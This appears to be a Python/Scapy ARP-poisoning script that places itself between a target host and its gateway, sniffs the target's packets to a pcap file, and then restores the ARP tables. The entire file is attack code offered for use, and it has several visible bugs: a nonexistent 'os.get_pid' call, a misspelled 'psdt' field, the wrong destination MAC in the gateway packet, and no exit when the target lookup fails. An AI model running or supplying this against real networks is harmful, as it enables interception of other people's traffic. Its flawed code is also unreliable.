from scapy.all import *
import os, sys, threading, signal

interface = sys.argv[1]
target_ip = sys.argv[2]
gateway_ip = sys.argv[3]
packet_count = 1000

conf.iface = interface # set up the interface
conf.verb = 0 # turn off output

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    # send ARP packets with the correct source MAC
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)

    # signal the main thread to exit
    os.kill(os.get_pid(), signal.SIGINT)

def get_mac(ip_address):
    # send an ARP request and get the MAC address from the response
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)

    # return the MAC address from a response
    for s, r in responses:
        return r[Ether].src
    return None

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()
    poison_target.op = 2 # opcode 2 (reply)
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.psdt = gateway_ip
    poison_gateway.hwdst = target_mac

    print("[*] Beginning the ARP poison. [CTRL-C to stop]")

    while True:
        try:
            send(poison_target)
            send(poison_gateway)

            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    print("[*] ARP poison attack finished.")

print("[*] Setting up {0}".format(interface))

gateway_mac = get_mac(gateway_ip)

if gateway_mac is not None:
    print("[*] Gateway {0} is at {1}".format(gateway_ip, gateway_mac))
else:
    print("[!!!] Failed to get gateway MAC. Exiting.")
    sys.exit(0)

target_mac = get_mac(target_ip)

if target_mac is not None:
    print("[*] Target {0} is at {1}".format(target_ip, target_mac))
else:
    print("[!!!] Failed to get target MAC. Exinting.")

# start poison thread
poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

try:
    print("[*] Starting sniffer for {0} packets".format(packet_count))

    bpf_filter = "ip host {0}".format(target_ip) # get packets sent from the target IP
    packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)

    # write out all captured packets
    wrpcap("arper.pcap", packets)

    # restore the network
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
# capture CTRL-C
except KeyboardInterrupt:
    # restore the network
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)